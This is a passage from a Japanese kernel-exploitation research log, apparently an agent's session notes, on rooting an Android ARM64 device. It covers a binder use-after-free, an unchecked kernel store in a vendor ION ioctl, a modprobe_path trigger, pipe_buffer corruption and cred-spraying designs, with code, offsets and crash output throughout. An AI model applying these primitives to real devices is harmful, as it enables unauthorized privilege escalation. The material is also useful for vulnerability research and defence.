| 2 | `iov[4].base` が `pool`（0 ページ） | `iov[0]` と同じページで衝突 | 専用の `pool+40*PAGE` |
| 3 | パイプが 1 ページ | 子が 81980 バイトを流せずブロック | `F_SETPIPE_SZ` を 1MB に |

修正後の算術:

```
SEG0123 = 16367
AIMOFF  = 81904     mod 4096 = 4080 → ちょうど 16 バイト
FEED    = 81980     = 81904 + 16 + 60

[0, 16367)      iov[0..3]
[16367, 81904)  iov[4]（膨張して 65537）
[81904, 81920)  aim 16バイト → chunk+0x50 = &iov[5]
[81920, 81980)  payload 60バイト → addr
```

パイプバッファ `[77824, 81920)` が aim の 16 バイトをちょうど包む。

### 7.6 書込みが成立する理由をソースで確定（T58）

一度「`copy_to_user` の `access_ok` でカーネルアドレスへの書き込みは塞がれる」と
結論しかけたが誤りだった。

```
rw_copy_check_uvector
    取り込み時に各セグメントへ access_ok を実行
    この時点で iov[5].base はまだ自分が設定したユーザーアドレス → 通る

pipe_read
    atomic = !iov_fault_in_pages_write(iov, chars)
      → fault_in_pages_writeable(uaddr, size)
        → __put_user(0, uaddr)
          arm64 の __put_user は裸の str + 例外テーブル。access_ok を呼ばない
          ARMv8.0 の part 0xd03 で PAN が無いので、EL1 からのカーネル VA への str は成功
      → fault_in が 0 を返す → atomic = 1

pipe_iov_copy_to_user（atomic == 1 の分岐）
    __copy_to_user_inatomic(dst, src, n)
      これは __copy_to_user の別名。裸の str
      → データはカーネルアドレスに書かれる
```

**`rw_copy_check_uvector` の `access_ok` が唯一のゲートで、それは
`iov[5]` が書き換わる前に実行される。**

### 7.7 `fault_in` の副作用を回避する 2 段書き込み（T59）

```c
static inline int fault_in_pages_writeable(char __user *uaddr, int size)
{
    ret = __put_user(0, uaddr);                 /* 先頭に 0 */
    if (ret == 0) {
        char __user *end = uaddr + size - 1;
        if ((addr & PAGE_MASK) != (end & PAGE_MASK))
            ret = __put_user(0, end);           /* 末尾にも 0 */
    }
    return ret;
}
```

`pipe_read` は `atomic = !iov_fault_in_pages_write(iov, chars)` を毎バッファ実行する。
もし `iov[4].base = cred+4` で `len = 65537` だと、`cred+4` と `cred+65541` の
**両方にゼロが書かれ、64KB 先のカーネルメモリを破壊して確実にパニックする。**

安全な設計:

```
iov[4].base = USER ページ     ← 65537 を安全に吸収（fault_in は自前メモリを叩く）
iov[5].base = TARGET          ← ここだけカーネルアドレス
iov[5].len  = paylen (60)     ← 1ページ以内
```

子プロセスの 2 段書き込み:

```
write #1  AIMOFF + 16 = 81920 バイト  → ちょうど 20 ページで境界に終わる
write #2  paylen = 60 バイト          → 独立したパイプバッファ
```

### 7.8 残り 2 つの算術誤り（T60）

**A. `iov[5].len` は取り込み時に確定する。**

`total_len` は `iov_length()` で取り込み時に固定され、コピーは `total_len == 0` で止まる。
したがって `iov[5].len` の初期値が膨張分（65537）+ aim（16）+ payload（60）を
合計して覆う必要がある。

```c
/* 誤 */ iovs[5].iov_len = paylen;                    /* 60 */
/* 正 */ iovs[5].iov_len = 65537 + 16 + paylen;       /* 65613 */
```

**B. aim の同じ反復で `iov_len -= 16` される。**

```c
copy_to_user(iov[5].base, aim, 16);   /* {aim0, aim8} を iov[5] に書く */
iov->iov_base += 16;                  /* iov[5].base = aim0+16 = TARGET */
iov->iov_len  -= 16;                  /* iov[5].len  = aim8-16 */
```

```c
/* 誤 */ u64 len = 0x100000;
/* 誤 */ u64 len = paylen;
/* 正 */ u64 len = paylen + 16;       /* -16 されて paylen になる */
```

最終監査:

```
SEG0123            = 16367
iov[4] inflated    = 65537      [16367, 81904)
AIMOFF             = 81904      mod4096 = 4080 → aim 16
pre write          = 81920      20ページちょうど
iov[5].len setup   = 65613      = 65537 + 16 + 60
total iov_length   = 81980
child stream       = 81980
一致
```

### 7.9 modprobe_path への戦略転換（T61）

`System.map` に KASLR 無効の確定アドレスがあった。`cred` を狙うより
`modprobe_path` の方が圧倒的に有利だと判断した。

| 観点 | cred 書き換え | modprobe_path |
| --- | --- | --- |
| アドレス特定 | task_struct 探索 → cred 読み出し | **`0xffffffc000c02d08` 固定** |
| 書き込み長 | 60 バイト、`cred+4` 境界 | **32 バイト、`0xd08` でページ内** |
| SELinux | `task_security_struct` の偽造が必要 | **不要**（カーネルが root で実行） |
| 失敗時 | カーネル構造体を壊してパニック | 26 バイトの文字列を壊すだけ |

トリガーは非特権で可能。

```
socket(AF_未登録, SOCK_RAW, 0)
    → request_module("net-pf-%d", family)
    → call_modprobe
    → call_usermodehelper(modprobe_path, ...)   ← カーネルが root で実行
```

`net/socket.c:1292` で確認。呼び出し元がカーネル自身なので SELinux Enforcing でも通る。

ページ安全性:

```
modprobe_path = 0x…c02d08  → low12 = 0xd08
書き込み長 32              → 0xd08 + 0x20 = 0xd28  （同一ページ）
KMOD_PATH_LEN = 256        → 32 バイトで十分
```

`mp.c` を作り、`do_write` に事前チェックを入れた。

```c
if (paylen == 0 || paylen > 3840) return 0;         /* 1ページ以内 */
if (((target & 0xfff) + paylen) > PAGE) return 0;   /* ページ跨ぎ禁止 */
if (target < 0xffffffc000000000ULL) return 0;       /* カーネル限定 */
```

この設計は実機では使われなかった。理由は T65–T75 で再確保が成立し、
`cred` 経由のほうが確実だったためである。
ただし「壊しても被害が小さい標的」という発想は正しく、後の `/system` 書き込みで活きた。

---

## 8. 閉包の確定と ION の発見（T63–T105、11-06 07:17–17:24）

### 8.1 ゲートを 8/8 に確定（T68、11-06 08:44）

T68 で `read_size = 72` の根拠をもう一度導出し、8 本すべて成功させた。

```
arm n=8 w0=0000720c w1=00007206      ← 8回連続
t=1 nfd=8 tn=8 delok=8 err=0/0 r=16400 e=0 meter=0x4141414141414141
```

`tn=8`（8 本すべてアーム成功）、`delok=8`（8 本すべて DEL 成功）。

修正したバグ:

| バグ | 内容 |
| --- | --- |
| `if (tn != i)` を `tn++` の後に評価 | 成功時に `sh->fd[i] = -1` となり fd -1 を DEL |
| `sh->ep[tn] = ep` を `moved` の内側 | `moved==false` で epoll fd 未保存（`err=9 EBADF`） |
| 子が `close(pp[1])` | 書き込み側を閉じていた |
| `tn==0` 分岐で `c` を参照 | fork 前に未宣言 |

**残る唯一の干渉源は `fork()`。** fork が arming の後に来ており、
`files_struct`/`sighand_struct`/`signal_struct` などの 512 バイト確保が
`c->page` を動かす。その結果 `slab_free` が `__slab_free`（遅い経路）に落ち、
次の `kmalloc(512)` が我々のチャンクを見ない。

### 8.2 `BINDER_THREAD_EXIT` の番号誤り（T70、11-06 09:07）

**これが最も大きな発見の 1 つである。**

```c
/* 実際の定義 */
#define BINDER_THREAD_EXIT  _IOW('b', 8, __s32)     /* size 4 */

/* 全ツールが使っていた定義 */
#define BINDER_THREAD_EXIT  _IO('b', 8)             /* size 0 */
```

`binder_ioctl` は `_IOC_SIZE(cmd)` を見る。size 0 は不正なので `-EINVAL`（errno 22）。
**つまり thread は一度も free されていなかった。**

修正後:

```
THREAD_EXIT rc=0 errno=0
```

**それ以前の readv/writev 再確保の結論（0/N）はすべて「thread が生きていた」状態で
測ったものだった。** これが T43–T49 の「再確保しない」の真の原因だった。

### 8.3 reclaim 成功（T75、11-06 09:55）

`NTH=2`、1 ページパイプ、parking 設計で再確保を取った。

```
k34: k=0 meter=41.. reclaimed=0
     k=1 meter=5a5a5a5a5a5a5a5a reclaimed=1
     k=2 .. k=5 すべて reclaimed=1
K34 reclaimed=5/6
```

`iov[4].iov_len` が 0 のまま `iov[4].iov_base` のページが書かれた——
`remove_wait_queue` の `spin_lock(&whead->lock)`（チャンク+0x48）以外に起こせない。
**iovec 配列が freed `binder_thread` を掴んだ直接証明が 6 回中 5 回。**

落とし穴:

`iov[5]` の宣言長を 0 にすると `total_len = iov[0..3]` ちょうどになり、
**コピーが `iov[4]` に到達しない**（`r=258048` で止まる）。
4096 を宣言して初めて `r=262144` になり観測できる。

`k40` では戻り値の超過で証明した。

```
k=0 kind=1 delok=1 r=262144 e=0  meter_bytes=4096 span=0x0..0xfff  mtr2=0
```

宣言した総長は `12288 + 245760 + 0 + 4096 = 258048`。
**実際の戻り値は `262144`** → **宣言より 4096 バイト多い**。
宣言より多く流れた唯一の説明は、コピー時点で `iov[4].iov_len` が非ゼロだったこと。

### 8.4 カーネル書き込みの唯一の経路と閉包（T77–T82）

T77 で `-EFAULT` の発生源を特定した。**これは前ラウンドの誤同定の訂正である。**

これまで `-EFAULT` を `pipe_read` のファルトイン（`iov_fault_in_pages_write`）に
帰していたが、実際は **`readv`/`writev` の syscall 入口**、
`fs/read_write.c` の `rw_copy_check_uvector` だった。

```c
for (seg = 0; seg < nr_segs; seg++) {
        void __user *buf = iov[seg].iov_base;
        ssize_t len = (ssize_t)iov[seg].iov_len;

        if (len < 0) { ret = -EINVAL; goto out; }
        if (type >= 0 && unlikely(!access_ok(vrfy_dir(type), buf, len))) {
                ret = -EFAULT;          /* ← ここ。ファイル操作の前 */
                goto out;
        }
}
```

実測（`k37.c`）で 3 種類のファイルが**同じ結果**を返した。パイプのコードが
関与していないことの証明である。

| 呼び出し | user page | `_text` | `.data` |
| --- | --- | --- | --- |
| `writev /dev/null` | **16** | `-14` | `-14` |
| `writev pipe` | **16** | `-14` | `-14` |
| `readv /dev/zero` | **16** | `-14` | `-14` |

範囲の意味論も一致:

```
user base, len 0x100000000  -> -14   (base+len が addr_limit を越える)
user base, len 0xfff        -> 4095  (ページ内、成功)
user base, len -1           -> -22   (len < 0 が先に発火)
```

**iovec 系 API はカーネルアドレスを一切運べない。**
`__copy_to_user_inatomic` が `access_ok` をしないという事実は、
その手前で拒否されるため無意味だった。

### 8.5 k42: ロックワード 65537 の数値証明（T78、11-06 11:27）

制御実験つきで、DEL が生きた配列に書いたことを数値で示した。

```
--- control: DEL skipped ---
skipdel  kind=1 delok=-2 r=328048 e=0  meter=0    (span 0x0..0x0)   sink=70000
         => iov[4] was skipped (len was 0)

--- test: DEL performed ---
k=0      kind=1 delok=1  r=327680 e=0  meter=65537  (span 0x0..0x10000)  sink=0
k=1      kind=1 delok=1  r=327680 e=0  meter=65537  (span 0x0..0x10000)  sink=0
k=2      kind=1 delok=1  r=327680 e=0  meter=65537  (span 0x0..0x10000)  sink=0
```

`65537 = 0x00010001` の意味:

```
spin_lock_irqsave(&q->lock)   -> lock に next=1 を書き、自分は ticket 0 を取得
spin_unlock_irqrestore(...)   -> owner を +1
=> chunk+0x48 の 8 バイトワードは 0x0000000000010001 = 65537
```

**測定値が導出と完全一致。** 再確保の証明が、推論ではなく数値になった。

`sink=0` の意味: `iov[5].base` に宣言したユーザーページは**1 バイトも受領していない**。
それでもコピーは 65537 バイトを `iov[4].base` に書き、`iov[5]` へ進んだ。

ただし「任意アドレスへの書き込み」ではない。`list_del` を
`next == prev == &q->task_list == chunk+0x50` で展開すると:

```
next->prev = prev   ->  chunk+0x58 = chunk+0x50
prev->next = next   ->  chunk+0x50 = chunk+0x50
```

**両方とも自己参照**である。書き込み先 `iov[5].base = chunk+0x50` は自分のチャンクの中。

### 8.6 k43: 制御されたカーネルヒープ越境書き込み（T79）

```
--- control: DEL skipped ---
skipdel  kind=1 delok=-2 r=323649 e=0 meter=0      sink=65601  total_len=323649

--- test: DEL performed ---
k=0      kind=1 delok=1  r=323649 e=0 meter=65537  sink=0      total_len=323649
         => 64 bytes written contiguously at chunk+0x50, no fault
```

両方とも `r == total_len`、`e == 0`。**宣言した全バイトが配送され、フォルトなし。**
違いは着地点だけ:

| | `meter`（`iov[4].base`） | `sink`（`iov[5].base`） |
| --- | --- | --- |
| DEL なし | 0 | **65601**（ユーザページ） |
| DEL あり | **65537** | **0** |

残り **W = 64 バイト**がカーネルスラブの `chunk+0x50` から `chunk+0x8f` へ書かれた。
**512 バイトオブジェクトの終端をまたいで隣へ越境している。**

`W=4096` で隣接 8 オブジェクトを潰して `panic_on_oops=1` で再起動した。`W=64` が安全。

### 8.7 構造的閉包（T80–T82）

T80–T81 で、binder UAF を起点にした**任意アドレス**書き込みが構造的に閉じていることを
確定した。理由は 3 つ。

1. `rw_copy_check_uvector` の入口 `access_ok` がカーネルアドレスを拒否する
2. `list_del` の 2 ストアは自己参照で、値も書き込み先も選べない
3. `fault_in_pages_writeable` が書き込み先の先頭と末尾にゼロを置く

結果として得られるのは「自分のチャンクから上方向への、値は選べるが
アドレスは選べない、長さ 64 バイト程度の越境書き込み」だけである。
これは cred にも `selinux_enforcing` にも届かない。

T81 で正直な報告に切り替えた。`root-achieved.md` を「未達」と書き、
到達点と壁を明示した。

#### 8.7.1 閉包の決め手：`fault_in` が行き先を潰していた（T81、11-06 12:30）

T81 で `k53` が失敗を**数値で**出した。

```
k53 HEAD=262143  FRONT=327680  HEAD+LOCKLEN=327680 (mod 4096 = 0)
    A=7f8d9e0ff0 LEN=35 PAYLEN=19

--- control: DEL skipped ---
skipdel  kind=1 delok=-2 r=331811 e=0 meter=0
--- test: DEL performed ---
k=0      kind=1 delok=1 r=327680 e=0 meter=65537
k=1      kind=1 delok=1 r=327680 e=0 meter=65537
```

`r` が **`327680` でぴったり止まる** = `HEAD + LOCKLEN`。
`iov[0..3]` が 262143、`iov[4]` が 65537（DEL の値、ここまで完全に成功）、
**`iov[5]` に入った瞬間に `EFAULT`**。しかも `ret` が既に非ゼロなので
`if (!ret) ret = error;` に当たらず、**エラーが隠れて正常終了に見える。**

`pipe_read` はコピー直前に必ずこれを呼ぶ。

```c
atomic = !iov_fault_in_pages_write(iov, chars);
```

`fault_in_pages_writeable()` は:

```c
ret = __put_user(0, uaddr);   /* uaddr = iov->iov_base */
```

**`iov[5].base` は `list_del` により `chunk+0x50`、そして `chunk+0x50` は
`iov[5].base` そのもの。** だから `__put_user(0, chunk+0x50)` が
**自分自身の行き先を 0 で上書き**し、直後のコピーが
`__copy_to_user_inatomic(NULL, ...)` になって `EFAULT`。

**`access_ok` ではなく、fault-in の「0 を書いて確かめる」実装が行き先を消していた。**

これが T59 で立てた「安全な 2 段書き込み」設計を否定した。
`iov[4]` をユーザページにして `fault_in` を逃がす工夫は、
**本命の `iov[5]` 自身を守れない**。`iov[5].base` は `chunk+0x50` であり、
`fault_in` はそこに 0 を書く。行き先を消した直後に同じ場所へコピーするので、
`copy` の dst は必ず NULL になる。

| 誤り | 訂正 |
| --- | --- |
| `r` が大きい = 書き込み成功 | **`r == HEAD+LOCKLEN` は失敗の signature** |
| `k43` の `W` バイトはスラブに書けた | **`iov[5]` のコピーは EFAULT**。`W` は「書けなかった量」 |
| 3 回の `write()` で境界を作る | **`pipe_read` が `bufs==0 && !waiting_writers && ret` で break** |
| パイプを 1MB に拡張 | **書き手が阻塞せず `waiting_writers==0`** になり逆効果 |

`iov[5].len` を宣言時に 0 にすれば `iov[5]` は読み飛ばされ `fault_in` も避けられるが、
**その場合 `chunk+0x50` への書き込み経路自体が発生しない。**

つまり `list_del` の 2 ワードを書き込み先に変換する経路は、
`fault_in_pages_writeable` と**原理的に両立しない**。
この primitive は「配列の隣を壊す」ことはできても「任意アドレスへ書く」ことはできない。

T81 の時点で `k43` の解釈も覆った。`k43` の `meter=65537 sink=0` も同じ経路の産物で、
`iov[5]` のコピーは失敗しているのに `ret` 非ゼロで表面化していなかった。
`0x00010001` の再確保証明は有効なまま残る。

#### 8.7.2 splice 系の検討と `k47`（T80–T81）

`fault_in` を通らないコピー経路として `vmsplice` / `splice` / `sendfile` を当たった。

- `vmsplice_to_pipe` は各セグメントを独立の `pipe_buffer` にする
- `get_iovec_page_array` は 1 ページを複数エントリに分割しうる
- `splice_to_pipe` は隣接ページをマージする

`k47` でリダイレクトの幾何を検証した。

```
k=0 kind=1 delok=1 r=335891 e=0 meter=65537
  payload at map+262128  => A+0   (target is A+16, map+262144)
  nonzero bytes=8191 range map+262128..map+270319 => A+0..A+8191
```

`A` を `target-16` に設定し、ペイロードは `A` に着地した。
つまり **ストアされた base がそのまま使われ、`+= 16` は適用されていない**。
これは `fault_in` が行き先を 0 にした後にコピーが始まるため、
`iov->iov_base` の前進が観測できないことと整合する。

T80 で潰した 3 つの自分のバグもここに属する。

| バグ | 正体 |
| --- | --- |
| `arm()` の同一 fd 再試行 | **毎回プローブを送るので未読レコードが増え、`kind=0` が永久に続く自己増幅** |
| `meter` の読み出し範囲 | `pool` 80 ページ確保で 100〜120 ページを走査 → **ユーザ空間 SIGSEGV** |
| `syscall 293` のダンプ | `do_ni_syscall` の未通知。**カーネル障害ではない** |

パニックの原因も `last_kmsg` で特定した。

```
Unable to handle kernel paging request at virtual address 5a5a5a5a5a5a5a72
PC is at __kmalloc_track_caller+0x78/0x214
R20: 5a5a5a5a5a5a5a5a
```

`5a5a` はバーストのフィラーバイト。**フィラーが隣接オブジェクトの `kmalloc`
管理構造を踏み抜いている**——`W` を大きくすると必ずこれが起きる。

### 8.8 ION 型バイトの総当たり（T83、11-06 13:23）

T82–T83 で「カーネル経路が閉じたので、root へ届く別面を実測で洗う」方針に転換した。
`/dev` の 0666 デバイスのうち、まだ触っていないのは `/dev/ion` だけだった。

#### 8.8.1 ioctl 番号の型バイト

`ion.c` の `ion_ioctl` は `_IOC_TYPE(cmd) != ION_TYPE` で弾く。
**当初この型バイトを `'i'`（0x69）と誤っていた。** 正しくは **`'I'`（0x49）**。

```c
#define ION_IOC_ALLOC   _IOWR('I', 0, struct ion_allocation_data)
#define ION_IOC_FREE    _IOWR('I', 1, struct ion_handle_data)
#define ION_IOC_SHARE   _IOWR('I', 4, struct ion_fd_data)
#define ION_IOC_CUSTOM  _IOWR('I', 6, struct ion_custom_data)
#define ION_IOC_PHYS    _IOWR('I', 9, struct ion_phys_data)
```

型が違うと全番号が `-ENOTTY` になる。これを `'i'` と誤っていたため、
最初の総当たりは「ハンドラに到達できない」と誤結論した。

サイズも重要だった。`_IOC_SIZE(cmd) > sizeof(data)` で `-EINVAL` になるので、
構造体サイズを正確に一致させる必要がある。

| nr | 名前 | size | 構造体 |
| --- | --- | --- | --- |
| 0 | ALLOC | 32 | `size_t len, align; u32 heap_id_mask, flags; s32 handle` |
| 1 | FREE | 4 | `s32 handle` |
| 2 | MAP | 8 | — |
| 4 | SHARE | 8 | `s32 handle, fd` |
| 5 | IMPORT | 8 | — |
| 6 | CUSTOM | 16 | `u32 cmd; unsigned long arg` |
| 7 | SYNC | 8 | — |
| 8 | NAME | 20 | `s32 fd; char name[16]` |
| 9 | PHYS | 12 | `s32 fd; u32 addr, flags` |
| 10 | NOTIFY | 8 | `s32 fd; u32 note` |
| 11 | SYNC_RANGE | 16 | `s32 fd; u32 offset, size, note` |

`ION_IOC_NAME` を `char name[64]`（=68 バイト）で作るとサイズ超過で `-ENOTTY`。
正しくは `char name[16]`（=20 バイト）。これも実測で踏んだ。

#### 8.8.2 ヒープの特定

| ビット | ヒープ | 実測 |
| --- | --- | --- |
| 0 | `ion_system_heap` | `alloc_pages`、LOW メモリ `0x4dbxxxxx`、PHYS 不可、order-0 を 1 ページずつ |
| 1 | — | ENODEV |
| 2 | `ion_carveout_heap` | gen_pool、固定、`0x7e700000` 以上、**24MB 枯渇で CMA フォールバック → 端末ハング** |
| 3 | — | ENODEV |

#### 8.8.3 `pxa_ion_ioctl` の唯一のストア

```c
case ION_IOC_PHYS:
{
    struct ion_phys_data *data = (struct ion_phys_data *)arg;   /* copy_from_user なし */
    struct dma_buf *dmabuf;
    struct pxa_ion_iommu_meta *meta;

    if (!pxa_ion_iommu_mapping)
        return -EFAULT;

    dmabuf = dma_buf_get(data->fd);          /* *(u32*)arg を読む */
    if (IS_ERR_OR_NULL(dmabuf))
        return -EFAULT;

    meta = dma_buf_meta_fetch(dmabuf, VPU_DMABUF_META_ID);
    if (!meta)
        meta = pxa_ion_iommu_map_dmabuf(pxa_ion_platform_dev, dmabuf);
    if (meta)
        data->addr = meta->iova;             /* *(u32*)(arg+4) に書く */
    else {
        pr_err("pxa ion: no dmabuf meta found\n");
        dma_buf_put(dmabuf);
        return -EFAULT;
    }

    dma_buf_put(dmabuf);
    break;
}
```

**`arg` がユーザポインタではなくカーネルポインタとして扱われている。**
`access_ok()` も `copy_from_user()` もない。
`ION_IOC_CUSTOM` は `_IOC_WRITE` なので `copy_to_user` も走らない。
**`arg+4` への書き込みは本物のカーネルストアである。**

#### 8.8.4 線形マップの特定（k71 のパニックが教えた）

`PAGE_OFFSET + phys` は `-EFAULT`、`PAGE_OFFSET + phys - 0x01000000` が**成功**。
`memstart = 0x80000000` を試した瞬間 `ffffffbffe700000` で oops したことが、
候補の切り分けになった（k71）。

```
Unable to handle kernel paging request at virtual address ffffffbffe700000
Oops: 96000006 [#1] PREEMPT SMP
pc : [<ffffffc000545e94>]
Kernel panic - not syncing: Fatal exception
```

#### 8.8.5 k73/k74: ストアの確定

```
dmabuf=5 phys=0x7e700000 iova=0x80000000 alias=0xffffffc07d700000
step0 user write visible after sync: at+0=0x11112222 -> yes
control (no CUSTOM): at+0=0x00000005 at+4=0xeeeeeeee
CUSTOM(alias) rc=0 errno=0
post-sync at+0=0x00000005 at+4=0x80000000 (iova=0x80000000)
RESULT: kernel STORED the IOVA at a kernel address we chose
offset 0x2000: rc=0 at+0x2004=0x80000000 -> STORE CONFIRMED
```

範囲と前提（k74）:

```
off=0x00000/0x1000/0x4000/0x8000/0xf000 すべて rc=0 word@+4=0x80000000
word@alias=0x00000005 (our dmabuf fd) -> rc=0   accepted
word@alias=0x7ffffff0 / 0 / 0xffffffff -> rc=-1 errno=14
```

**オフセットが物理アドレスに追従**し、**カーネルは本当にその 4 バイトを読んでいる**。

#### 8.8.6 primitive の正確な形

| 項目 | 内容 |
| --- | --- |
| 書き込み先 | `0xffffffc000000000 + (phys - 0x01000000) + 4 + offset` |
| 書き込み値 | ION の IOVA（`0x80000000 + k*0x1000`） |
| 書き込み長 | **4 バイト固定** |
| 前提 | そのアドレスの 4 バイトが**自分の dma-buf fd** であること |

「任意」がバッファ内に制限される理由:

`arg` の下位 4 バイトが有効な fd でなければ `dma_buf_get` が失敗し `-EFAULT`。
書き込みが起きるのは読み取りが成功したときだけ。読み取りが成功するのは、
そこに自分の fd 番号を置いたときだけ。

**つまり「fd 番号を書いたページ」＝「書き込み先」。**

#### 8.8.7 それでも重大なこと

1. `copy_from_user` を経由しないカーネルストアが uid 2000 から可能
2. 線形マップのアドレスを物理アドレスから算出できる
3. `phys` を ION が開示する

この組み合わせは、**バッファの物理ページを free して別用途に再利用させれば、
そのページを経由して任意の物理ページへ届く**可能性を示す。

### 8.9 反復可能なクロスプロセス書き込み（T85–T86）

```
k81: B holds phys=0x7e800000: [+0]=0x00000005 [+4]=0x80000000 [+8]=0x00000005
k85: 8/8 反復成功（別プロセスのページへのストア）
k89: 新規ページの 66.8% が非ゼロ、3822/6144 にカーネルポインタパターン
k90: IOVA 粒度 0x1000、base 0x80000000、単調
k91: 完全制御 — target_iova=0x80005000、aim_off=0x840、子が +0x844 で 0x80005000 を報告
```

`k96` ではスラブ回収を 14/15 で観測した。死滅パターンを 1 スロット単位で解析:

```
slots   0-  3  bytes    0-  31  dead  x4
slots   4-  7  bytes   32-  63  ALIVE x4
slots   8- 27  bytes   64- 223  dead  x20
slots  28- 31  bytes  224- 255  ALIVE x4
slots  32- 51  bytes  256- 415  dead  x20
slots  52- 55  bytes  416- 447  ALIVE x4
```

**192 バイト周期で、各オブジェクトの先頭 32 バイトだけが生き残る。**
`kmalloc-192` のスラブにページが取られ、先頭 32 バイトが初期化で上書きされ、
残りは `kzalloc` のゼロ化で消える構造と一致する。

| 構造体 | サイズ | 到達手段 |
| --- | --- | --- |
| **`pipe_inode_info`** | 136 B → kmalloc-192 | `pipe()` |
| `file_lock` | 192 B | `fcntl(F_SETLK)` |
| `epitem` | 128 B → kmalloc-128 | `epoll_ctl` |
| `seq_file` | 120 B → kmalloc-128 | `/proc` |

`pipe_inode_info` が本命。先頭 32 バイトが `struct mutex` で、`mutex_init()` が
書き込むため「先頭だけ死ぬ」パターンと一致する。

### 8.10 carveout 枯渇によるハング（T89、11-06 15:37）

`k102` で bit 2 の carveout を 24MB ドレインした。結果、CMA フォールバックが発火し、
断片化状態で長時間のマイグレーションが走り、`ion_device` と CMA のロックが
保持され続けて USB スタックが停止した。

```
paddr = ion_carveout_allocate(heap, size, align);   /* gen_pool_alloc */
if (paddr == ION_CARVEOUT_ALLOCATE_FAIL) {
    page = dma_alloc_from_contiguous(NULL, size >> PAGE_SHIFT, get_order(align));
    buffer->flags |= ION_FLAG_CMA;
}
```

復旧は物理操作のみだった。この後ローカルに実験プロトコルを書き、
以降の実験プロトコルを固定した。

1. bit 2 への大量確保を禁止（carveout 枯渇＝端末停止）
2. 圧力は bit 0 のみ
3. 1 バイナリ 1 破壊操作、実行前にログ
4. 各実行後に生存確認
5. 20 秒無応答なら手動再起動

このプロトコルは最後まで守られた。

### 8.11 値の制約を攻撃面に転化する設計（T91–T98、11-06 16:16–17:02）

端末がハングしたまま、オフラインで「値の制約をどう突破するか」を設計した局面である。
新規の実機実験はできないので、ソース読解と設計だけを進めた。

#### `pipe_write` の範囲外書込み（T91）

`pipe->buffers` を `0x80000000` にすると、その制約が武器になる。

```c
if (bufs < pipe->buffers) {                        /* buffers = 0x80000000 */
    int newbuf = (pipe->curbuf + bufs) & (pipe->buffers-1);
    struct pipe_buffer *buf = pipe->bufs + newbuf;
    ...
    buf->page = page;
    buf->ops = &anon_pipe_buf_ops;
    buf->offset = 0;
    buf->len = chars;
    buf->flags = 0;
    pipe->nrbufs = ++bufs;
}
```

`buffers = 0x80000000` のとき:

1. マスクは `buffers - 1 = 0x7FFFFFFF`（15 ではない）
2. `newbuf = curbuf + bufs`（小さな値のまま）
3. `buf = pipe->bufs + newbuf` → **16 エントリ配列の外側**
4. 各反復で `struct pipe_buffer`（40 バイト）を丸ごと書き込む

`free_pipe_info` は:

```c
for (i = 0; i < pipe->buffers; i++) {
    struct pipe_buffer *buf = pipe->bufs + i;
    if (buf->ops)
        buf->ops->release(pipe, buf);
}
```

`buffers = 0x80000000` なので **21 億エントリを走査**し、見つけた `ops` に対して
**間接呼び出し**を行う。

**`0x80000000` はまさに IOVA の最小値である。** 書き込める値の制約が、
マスクを壊すのに最適な値になる。**制約が攻撃面に転化した。**

#### 識別手法：ゲートを「小さなアルファベットの読み取り」にする

fd 0 と fd 16 に dma-buf を置くと:

```
gate(addr) == 0  <=>  その4バイトが {0, 16} のいずれか
```

アイドル状態の `pipe_inode_info`:

| フィールド | オフセット | 値 |
| --- | --- | --- |
| `nrbufs` | +64 | 0 |
| `curbuf` | +68 | 0 |
| `buffers` | +72 | **16** |
| `readers` | +76 | 1 |
| `writers` | +80 | 1 |

**この 5 つを同時にテストすれば、他のゼロ埋め領域と区別できる。**
fd 16 を閉じて `+72` を再テストし、失敗すれば「値は 16 だった」と確定する。

#### `pipe_buffer.len` による全 RAM 読み出し（T94）

`pipe_read` には**ページのクランプが無い**。

```c
chars = buf->len;
if (chars > total_len) chars = total_len;      /* total_len はユーザバッファ長 */
```

`kmap()` は `!HIGHMEM` なので `page_address()` = 線形マップのアドレス。
`pipe_iov_copy_to_user` は例外テーブル内で `copy_to_user(user, addr + *offset, copy)` を
実行する。**`len = 0x80000000` なら、物理メモリの無制限かつフォルト安全な読み出しになる。**

```
k114 の設計:
  1. bit 2 から最初のバッファ → IOVA = 0x80000000
  2. fd 0 に dup → ゼロ検出器
  3. fd 16 に dma-buf → 16 検出器
  4. bit 0 から低位ページを確保、ゲート fd を植えて線形マップで同定
  5. 解放 → パイプ 500 本 → kmalloc-192 に pipe_inode_info
  6. 8 バイト刻みで 5 フィールドの署名を照合
  7. 一致した箇所で fd 16 を閉じて +72 を再確認
  8. curbuf に対して 1 回だけストア → buffers が 0x80000000
```

読む起点は `page_address(buf->page)`、つまり**パイプのデータページ**なので、
カーネルイメージ（`0x01c00000` 未満）へ歩くには低位ページを確保する必要がある。

#### 値の制約の再解釈（T100）

`0x80000000` は `CAP_SETFCAP`（bit 31）でもある。
`k=0` のバッファは必ず `0x80000000` を運ぶので、
**「ケーパビリティを 1 つ付与する」という最小の成果が常に得られる。**

この認識が T107 以降の `k126`（IOVA → ケーパビリティ対応表）に直結した。

### 8.12 スラブ回収の順序を詰める（T102–T105、11-06 17:13–17:24）

`cred_jar` を狙う設計を 4 版重ね、それぞれの欠陥を潰した。

| 版 | 欠陥 | 修正 |
| --- | --- | --- |
| `k121` | 確保順序が逆 | ページ同定 → 解放 → churn の順に |
| `k122` | 300 子を fork して即 `_exit` → `cred_jar` に空きが残り、後の `setresuid` が空きを再利用して新しいスラブを要求しない | 子を `pause()` で生かしておく |
| `k123` | 親の `commit_creds` が古い cred を解放して空きスロットが 1 個戻り、2 回目以降そのスロットを再利用するだけ | ページ解放の**後**に fork する |
| `k124` | 5 条件のうち `cap_bset` 非ゼロを要求していた。**これは測定ではなく前提** | `cap_bset` を署名から外し、データとして記録するだけに |

`k125` の 7 条件署名:

```c
if (gate(o + 56)  != 0) continue;   /* cap_effective 下位 == 0 */
if (gate(o + 48)  != 0) continue;   /* cap_permitted 下位 == 0 */
if (gate(o + 4)   == 0) continue;   /* uid != 0（2000） */
if (gate(o + 8)   == 0) continue;   /* gid != 0（2000） */
if (gate(o + 112) == 0) continue;   /* security != NULL */
if (gate(o + 120) == 0) continue;   /* user != NULL */
if (gate(o + 128) == 0) continue;   /* user_ns != NULL */
```

ポインタ 3 本が最も強い証拠になる。

```c
/* kernel/cred.c: prepare_creds */
new->security = NULL;
if (security_prepare_creds(new, old, GFP_KERNEL) < 0) ...

/* security/selinux/hooks.c: selinux_cred_prepare */
tsec = kmemdup(old_tsec, sizeof(struct task_security_struct), gfp);
new->security = tsec;        /* ← 必ず非 NULL になる */
```

`prepare_creds()` は `security` を明示的に NULL にし、LSM が必ず埋める。
